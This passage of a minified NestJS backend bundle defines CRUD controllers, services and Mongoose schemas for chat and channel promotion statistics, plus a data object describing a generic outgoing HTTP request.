o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatController=void 0;const a=i(3563),s=i(9742),c=i(1630),l=i(5639),p=i(7108);let d=class{constructor(e){this.promoteStatService=e}async create(e){return this.promoteStatService.create(e)}async findByClient(e){return this.promoteStatService.findByClient(e)}async update(e,t){return this.promoteStatService.update(e,t)}async deleteOne(e){return this.promoteStatService.deleteOne(e)}async deleteAll(){return this.promoteStatService.deleteAll()}};t.PromoteStatController=d,n([(0,a.Post)(),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[l.CreatePromoteStatDto]),o("design:returntype",Promise)],d.prototype,"create",null),n([(0,a.Get)(":client"),r(0,(0,a.Param)("client")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],d.prototype,"findByClient",null),n([(0,a.Put)(":client"),r(0,(0,a.Param)("client")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,p.UpdatePromoteStatDto]),o("design:returntype",Promise)],d.prototype,"update",null),n([(0,a.Delete)(":client"),r(0,(0,a.Param)("client")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],d.prototype,"deleteOne",null),n([(0,a.Delete)(),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],d.prototype,"deleteAll",null),t.PromoteStatController=d=n([(0,s.ApiTags)("promote-stats"),(0,a.Controller)("promote-stats"),o("design:paramtypes",[c.PromoteStatService])],d)},3085:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatModule=void 0;const o=i(5774),r=i(3563),a=i(5839),s=i(1630),c=i(7317),l=i(937),p=i(8009);let d=class{};t.PromoteStatModule=d,t.PromoteStatModule=d=n([(0,r.Module)({imports:[o.initModule,a.MongooseModule.forFeature([{name:l.PromoteStat.name,collection:"promoteStats",schema:l.PromoteStatSchema}]),p.ClientModule],controllers:[c.PromoteStatController],providers:[s.PromoteStatService],exports:[s.PromoteStatService]})],d)},1630:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatService=void 0;const a=i(3563),s=i(5839),c=i(6037),l=i(937),p=i(5562);let d=class{constructor(e,t){this.promoteStatModel=e,this.clientService=t}async create(e){return new this.promoteStatModel(e).save()}async findAll(){return await this.promoteStatModel.find().sort({totalCount:-1}).exec()}async findByClient(e){const t=await this.promoteStatModel.findOne({client:e}).exec();if(!t)throw new a.NotFoundException(`PromoteStat not found for client ${e}`);return t}async update(e,t){const i=await this.promoteStatModel.findOneAndUpdate({client:e},t,{new:!0}).exec();if(!i)throw new a.NotFoundException(`PromoteStat not found for client ${e}`);return i}async deleteOne(e){if(0===(await this.promoteStatModel.deleteOne({client:e}).exec()).deletedCount)throw new a.NotFoundException(`PromoteStat not found for client ${e}`)}async deleteAll(){await this.promoteStatModel.deleteMany({}).exec()}async reinitPromoteStats(){const e=await this.findAll();for(const t of e)await this.promoteStatModel.updateOne({client:t.client},{$set:{totalCount:0,uniqueChannels:0,releaseDay:Date.now(),lastUpdatedTimeStamp:Date.now(),data:{}}})}};t.PromoteStatService=d,t.PromoteStatService=d=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)(l.PromoteStat.name)),r(1,(0,a.Inject)((0,a.forwardRef)((()=>p.ClientService)))),o("design:paramtypes",[c.Model,p.ClientService])],d)},937:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatSchema=t.PromoteStat=void 0;const r=i(5839),a=i(9742);let s=class{};t.PromoteStat=s,n([(0,a.ApiProperty)({example:"shruthi1",description:"Client ID"}),(0,r.Prop)({required:!0,unique:!0}),o("design:type",String)],s.prototype,"client",void 0),n([(0,a.ApiProperty)({example:{Girls_Chating_Group_07:4,girls_friends_chatting_group_01:14},description:"Data"}),(0,r.Prop)({required:!0,type:Map,of:Number}),o("design:type",Map)],s.prototype,"data",void 0),n([(0,a.ApiProperty)({example:552,description:"Total Count"}),(0,r.Prop)({required:!0}),o("design:type",Number)],s.prototype,"totalCount",void 0),n([(0,a.ApiProperty)({example:314,description:"Unique Channels"}),(0,r.Prop)({required:!0}),o("design:type",Number)],s.prototype,"uniqueChannels",void 0),n([(0,a.ApiProperty)({example:1719929752982,description:"Release Day"}),(0,r.Prop)({required:!0}),o("design:type",Number)],s.prototype,"releaseDay",void 0),n([(0,a.ApiProperty)({example:!0,description:"Is Active"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"isActive",void 0),n([(0,a.ApiProperty)({example:1719929752982,description:"Last Updated TimeStamp"}),(0,r.Prop)({required:!0}),o("design:type",Number)],s.prototype,"lastUpdatedTimeStamp",void 0),n([(0,a.ApiProperty)({example:["And_Girls_Boys_Group_Chatting","Girls_Chating_Group_07"],description:"Channels"}),(0,r.Prop)({required:!0,type:[String]}),o("design:type",Array)],s.prototype,"channels",void 0),t.PromoteStat=s=n([(0,r.Schema)()],s),t.PromoteStatSchema=r.SchemaFactory.createForClass(s)},8953:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ExecuteRequestDto=void 0;const r=i(7403),a=i(9742),s=i(4922);var c;!function(e){e.JSON="json",e.TEXT="text",e.STREAM="stream",e.BLOB="blob",e.DOCUMENT="document",e.ARRAYBUFFER="arraybuffer"}(c||(c={}));class l{}t.ExecuteRequestDto=l,n([(0,a.ApiProperty)({description:"The URL to send the request to"}),(0,r.IsUrl)({},{message:"Please provide a valid URL"}),o("design:type",String)],l.prototype,"url",void 0),n([(0,a.ApiPropertyOptional)({enum:["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"],default:"GET"}),(0,r.IsEnum)(["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"]),(0,r.IsOptional)(),o("design:type",String)],l.prototype,"method",void 0),n([(0,a.ApiPropertyOptional)({type:Object,additionalProperties:{type:"string"}}),(0,r.IsObject)(),(0,r.IsOptional)(),o("design:type",Object)],l.prototype,"headers",void 0),n([(0,a.ApiPropertyOptional)({description:"Request body data"}),(0,r.IsOptional)(),o("design:type",Object)],l.prototype,"data",void 0),n([(0,a.ApiPropertyOptional)({type:Object,additionalProperties:{type:"string"}}),(0,r.IsObject)(),(0,r.IsOptional)(),o("design:type",Object)],l.prototype,"params",void 0),n([(0,a.ApiPropertyOptional)({enum:c,default:c.JSON}),(0,r.IsEnum)(c),(0,r.IsOptional)(),o("design:type",String)],l.prototype,"responseType",void 0),n([(0,a.ApiPropertyOptional)({description:"Request timeout in milliseconds",default:3e4,minimum:1e3,maximum:3e5}),(0,r.IsNumber)(),(0,r.Min)(1e3),(0,r.Max)(3e5),(0,r.IsOptional)(),(0,s.Transform)((({value:e})=>parseInt(e))),o("design:type",Number)],l.prototype,"timeout",void 0),n([(0,a.ApiPropertyOptional)({description:"Whether to follow redirects",default:!0}),(0,r.IsOptional)(),(0,s.Transform)((({value:e})=>"true"===e||!0===e)),o("design:type",Boolean)],l.prototype,"followRedirects",void 0),n([(0,a.ApiPropertyOptional)({description:"Maximum number of redirects to follow",default:5,minimum:0,maximum:10}),(0,r.IsNumber)(),(0,r.Min)(0),(0,r.Max)(10),(0,r.IsOptional)(),(0,s.Transform)((({value:e})=>parseInt(e))),o("design:type",Number)],l.prototype,"maxRedirects",void 0)},3255:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateStatDto=void 0;const r=i(9742);class a{}t.CreateStatDto=a,n([(0,r.ApiProperty)({example:"6785668464",description:"Chat ID"}),o("design:type",String)],a.prototype,"chatId",void 0),n([(0,r.ApiProperty)({example:12,description:"Count"}),o("design:type",Number)],a.prototype,"count",void 0),n([(0,r.ApiProperty)({example:50,description:"Pay Amount"}),o("design:type",Number)],a.prototype,"payAmount",void 0),n([(0,r.ApiProperty)({example:!0,description:"Demo Given"}),o("design:type",Boolean)],a.prototype,"demoGiven",void 0),n([(0,r.ApiProperty)({example:!0,description:"Demo Given Today"}),o("design:type",Boolean)],a.prototype,"demoGivenToday",void 0),n([(0,r.ApiProperty)({example:!1,description:"New User"}),o("design:type",Boolean)],a.prototype,"newUser",void 0),n([(0,r.ApiProperty)({example:!0,description:"Paid Reply"}),o("design:type",Boolean)],a.prototype,"paidReply",void 0),n([(0,r.ApiProperty)({example:"Amaan Khan",description:"Name"}),o("design:type",String)],a.prototype,"name",void 0),n([(0,r.ApiProperty)({example:!1,description:"Second Show"}),o("design:type",Boolean)],a.prototype,"secondShow",void 0),n([(0,r.ApiProperty)({example:null,description:"Did Pay"}),o("design:type",Boolean)],a.prototype,"didPay",void 0),n([(0,r.ApiProperty)({example:"shruthi1",description:"Client"}),o("design:type",String)],a.prototype,"client",void 0),n([(0,r.ApiProperty)({example:"shruthi",description:"Profile"}),o("design:type",String)],a.prototype,"profile",void 0)},8890:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.StatController=void 0;const a=i(3563),s=i(9742),c=i(2790),l=i(3255),p=i(7180);let d=class{constructor(e){this.statService=e}async create(e){return this.statService.create(e)}async findByChatIdAndProfile(e,t){return this.statService.findByChatIdAndProfile(e,t)}async update(e,t,i){return this.statService.update(e,t,i)}async deleteOne(e,t){return this.statService.deleteOne(e,t)}async deleteAll(){return this.statService.deleteAll()}};t.StatController=d,n([(0,a.Post)(),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[l.CreateStatDto]),o("design:returntype",Promise)],d.prototype,"create",null),n([(0,a.Get)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),o("design:type",Function),o("design:paramtypes",[String,String]),o("design:returntype",Promise)],d.prototype,"findByChatIdAndProfile",null),n([(0,a.Put)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),r(2,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,String,p.UpdateStatDto]),o("design:returntype",Promise)],d.prototype,"update",null),n([(0,a.Delete)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),o("design:type",Function),o("design:paramtypes",[String,String]),o("design:returntype",Promise)],d.prototype,"deleteOne",null),n([(0,a.Delete)(),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],d.prototype,"deleteAll",null),t.StatController=d=n([(0,s.ApiTags)("stats"),(0,a.Controller)("stats"),o("design:paramtypes",[c.StatService])],d)},4181:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.StatModule=void 0;const o=i(3563),r=i(5839),a=i(2790),s=i(8890),c=i(8126),l=i(5774);let p=class{};t.StatModule=p,t.StatModule=p=n([(0,o.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:"StatsModule",collection:"stats",schema:c.StatSchema}])],controllers:[s.StatController],providers:[a.StatService],exports:[a.StatService]})],p)},8126:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.StatSchema=t.Stat=void 0;const r=i(5839),a=i(9742);let s=class{};t.Stat=s,n([(0,a.ApiProperty)({example:"6785668464",description:"Chat ID"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"chatId",void 0),n([(0,a.ApiProperty)({example:12,description:"Count"}),(0,r.Prop)({required:!0}),o("design:type",Number)],s.prototype,"count",void 0),n([(0,a.ApiProperty)({example:50,description:"Pay Amount"}),(0,r.Prop)({required:!0}),o("design:type",Number)],s.prototype,"payAmount",void 0),n([(0,a.ApiProperty)({example:!0,description:"Demo Given"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"demoGiven",void 0),n([(0,a.ApiProperty)({example:!0,description:"Demo Given Today"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"demoGivenToday",void 0),n([(0,a.ApiProperty)({example:!1,description:"New User"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"newUser",void 0),n([(0,a.ApiProperty)({example:!0,description:"Paid Reply"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"paidReply",void 0),n([(0,a.ApiProperty)({example:"Amaan Khan",description:"Name"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"name",void 0),n([(0,a.ApiProperty)({example:!1,description:"Second Show"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"secondShow",void 0),n([(0,a.ApiProperty)({example:null,description:"Did Pay"}),(0,r.Prop)({required:!1}),o("design:type",Boolean)],s.prototype,"didPay",void 0),n([(0,a.ApiProperty)({example:"shruthi1",description:"Client"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"client",void 0),n([(0,a.ApiProperty)({example:"shruthi",description:"Profile"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"profile",void 0),t.Stat=s=n([(0,r.Schema)()],s),t.StatSchema=r.SchemaFactory.createForClass(s),t.StatSchema.index({chatId:1,profile:1,client:1},{unique:!0})},2790:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.StatService=void 0;const a=i(3563),s=i(5839),c=i(6037);let l=class{constructor(e){this.statModel=e}async create(e){return new this.statModel(e).save()}async findAll(){return await this.statModel.find().exec()}async findByChatIdAndProfile(e,t){const i=await this.statModel.findOne({chatId:e,profile:t}).exec();if(!i)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return i}async update(e,t,i){const n=await this.statModel.findOneAndUpdate({chatId:e,profile:t},i,{new:!0}).exec();if(!n)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return n}async deleteOne(e,t){if(0===(await this.statModel.deleteOne({chatId:e,profile:t}).exec()).deletedCount)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`)}async deleteAll(){await this.statModel.deleteMany({}).exec()}};t.StatService=l,t.StatService=l=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)("StatsModule")),o("design:paramtypes",[c.Model])],l)},7180:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateStatDto=void 0;const n=i(9742),o=i(3255);class r extends((0,n.PartialType)(o.CreateStatDto)){}t.UpdateStatDto=r},1415:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateStatDto=void 0;const r=i(9742);class a{}t.CreateStatDto=a,n([(0,r.ApiProperty)({example:"6785668464",description:"Chat ID"}),o("design:type",String)],a.prototype,"chatId",void 0),n([(0,r.ApiProperty)({example:12,description:"Count"}),o("design:type",Number)],a.prototype,"count",void 0),n([(0,r.ApiProperty)({example:50,description:"Pay Amount"}),o("design:type",Number)],a.prototype,"payAmount",void 0),n([(0,r.ApiProperty)({example:!0,description:"Demo Given"}),o("design:type",Boolean)],a.prototype,"demoGiven",void 0),n([(0,r.ApiProperty)({example:!0,description:"Demo Given Today"}),o("design:type",Boolean)],a.prototype,"demoGivenToday",void 0),n([(0,r.ApiProperty)({example:!1,description:"New User"}),o("design:type",Boolean)],a.prototype,"newUser",void 0),n([(0,r.ApiProperty)({example:!0,description:"Paid Reply"}),o("design:type",Boolean)],a.prototype,"paidReply",void 0),n([(0,r.ApiProperty)({example:"Amaan Khan",description:"Name"}),o("design:type",String)],a.prototype,"name",void 0),n([(0,r.ApiProperty)({example:!1,description:"Second Show"}),o("design:type",Boolean)],a.prototype,"secondShow",void 0),n([(0,r.ApiProperty)({example:null,description:"Did Pay"}),o("design:type",Boolean)],a.prototype,"didPay",void 0),n([(0,r.ApiProperty)({example:"shruthi1",description:"Client"}),o("design:type",String)],a.prototype,"client",void 0),n([(0,r.ApiProperty)({example:"shruthi",description:"Profile"}),o("design:type",String)],a.prototype,"profile",void 0)},9531:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.Stat2Controller=void 0;const a=i(3563),s=i(9742),c=i(8504),l=i(1415),p=i(5986);let d=class{constructor(e){this.statService=e}async create(e){return this.statService.create(e)}async findByChatIdAndProfile(e,t){return this.statService.findByChatIdAndProfile(e,t)}async update(e,t,i){return this.statService.update(e,t,i)}async deleteOne(e,t){return this.statService.deleteOne(e,t)}async deleteAll(){return this.statService.deleteAll()}};t.Stat2Controller=d,n([(0,a.Post)(),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[l.CreateStatDto]),o("design:returntype",Promise)],d.prototype,"create",null),n([(0,a.Get)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),o("design:type",Function),o("design:paramtypes",[String,String]),o("design:returntype",Promise)],d.prototype,"findByChatIdAndProfile",null),n([(0,a.Put)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),r(2,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,String,p.UpdateStatDto]),o("design:returntype",Promise)],d.prototype,"update",null),n([(0,a.Delete)(":chatId/:profile"),r(0,(0,a.Param)("chatId")),r(1,(0,a.Param)("profile")),o("design:type",Function),o("design:paramtypes",[String,String]),o("design:returntype",Promise)],d.prototype,"deleteOne",null),n([(0,a.Delete)(),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],d.prototype,"deleteAll",null),t.Stat2Controller=d=n([(0,s.ApiTags)("stats2"),(0,a.Controller)("stats2"),o("design:paramtypes",[c.Stat2Service])],d)},5471:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.Stat2Module=void 0;const o=i(3563),r=i(5839),a=i(8504),s=i(9531),c=i(4060),l=i(5774);let p=class{};t.Stat2Module=p,t.Stat2Module=p=n([(0,o.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:"Stats2Module",collection:"stats2",schema:c.StatSchema}])],controllers:[s.Stat2Controller],providers:[a.Stat2Service],exports:[a.Stat2Service]})],p)},4060:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.StatSchema=t.Stat2=void 0;const r=i(5839),a=i(9742);let s=class{};t.Stat2=s,n([(0,a.ApiProperty)({example:"6785668464",description:"Chat ID"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"chatId",void 0),n([(0,a.ApiProperty)({example:12,description:"Count"}),(0,r.Prop)({required:!0}),o("design:type",Number)],s.prototype,"count",void 0),n([(0,a.ApiProperty)({example:50,description:"Pay Amount"}),(0,r.Prop)({required:!0}),o("design:type",Number)],s.prototype,"payAmount",void 0),n([(0,a.ApiProperty)({example:!0,description:"Demo Given"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"demoGiven",void 0),n([(0,a.ApiProperty)({example:!0,description:"Demo Given Today"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"demoGivenToday",void 0),n([(0,a.ApiProperty)({example:!1,description:"New User"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"newUser",void 0),n([(0,a.ApiProperty)({example:!0,description:"Paid Reply"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"paidReply",void 0),n([(0,a.ApiProperty)({example:"Amaan Khan",description:"Name"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"name",void 0),n([(0,a.ApiProperty)({example:!1,description:"Second Show"}),(0,r.Prop)({required:!0}),o("design:type",Boolean)],s.prototype,"secondShow",void 0),n([(0,a.ApiProperty)({example:null,description:"Did Pay"}),(0,r.Prop)({required:!1}),o("design:type",Boolean)],s.prototype,"didPay",void 0),n([(0,a.ApiProperty)({example:"shruthi1",description:"Client"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"client",void 0),n([(0,a.ApiProperty)({example:"shruthi",description:"Profile"}),(0,r.Prop)({required:!0}),o("design:type",String)],s.prototype,"profile",void 0),t.Stat2=s=n([(0,r.Schema)()],s),t.StatSchema=r.SchemaFactory.createForClass(s),t.StatSchema.index({chatId:1,profile:1,client:1},{unique:!0})},8504:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.Stat2Service=void 0;const a=i(3563),s=i(5839),c=i(6037);let l=class{constructor(e){this.statModel=e}async create(e){return new this.statModel(e).save()}async findByChatIdAndProfile(e,t){const i=await this.statModel.findOne({chatId:e,profile:t}).exec();if(!i)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return i}async update(e,t,i){const n=await this.statModel.findOneAndUpdate({chatId:e,profile:t},i,{new:!0}).exec();if(!n)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`);return n}async findAll(){return await this.statModel.find().exec()}async deleteOne(e,t){if(0===(await this.statModel.deleteOne({chatId:e,profile:t}).exec()).deletedCount)throw new a.NotFoundException(`Stat not found for chatId ${e} and profile ${t}`)}async deleteAll(){await this.statModel.deleteMany({}).exec()}};t.Stat2Service=l,t.Stat2Service=l=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)("Stats2Module")),o("design:paramtypes",[c.Model])],l)},5986:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateStatDto=void 0;const n=i(9742),o=i(1415);class r extends((0,n.PartialType)(o.CreateStatDto)){}t.UpdateStatDto=r},2841:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TimestampController=void 0;const a=i(3563),s=i(9742),c=i(9642);let l=class{constructor(e){this.timestampService=e}async findOne(){return this.timestampService.findOne()}async getClientsWithTimeDifference(e){const 